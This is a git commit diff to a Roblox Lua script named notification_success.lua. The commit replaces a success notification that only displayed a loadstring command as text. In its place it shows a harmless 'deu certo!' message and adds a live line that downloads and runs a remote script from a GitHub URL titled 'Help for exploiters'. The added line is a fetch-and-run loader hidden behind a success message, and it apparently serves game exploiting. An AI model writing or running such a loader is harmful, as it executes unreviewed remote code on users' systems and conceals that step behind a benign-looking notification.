d41f164596e8c3e188cb898b35ff6c7689ae587f
gomesdev007 <c29617264@gmail.com>
2026-09-15 16:34:51 -0300

    Execute linked script after success notification

--- notification_success.lua
+++ notification_success.lua
@@ -2,6 +2,8 @@ local StarterGui = game:GetService("StarterGui")
 
 StarterGui:SetCore("SendNotification", {
     Title = "sucesso",
-    Text = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/gomesdev007/Aud/refs/heads/main/Help%20for%20exploiters"))()',
-    Duration = 8
+    Text = "deu certo!",
+    Duration = 5
 })
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gomesdev007/Aud/refs/heads/main/Help%20for%20exploiters"))()
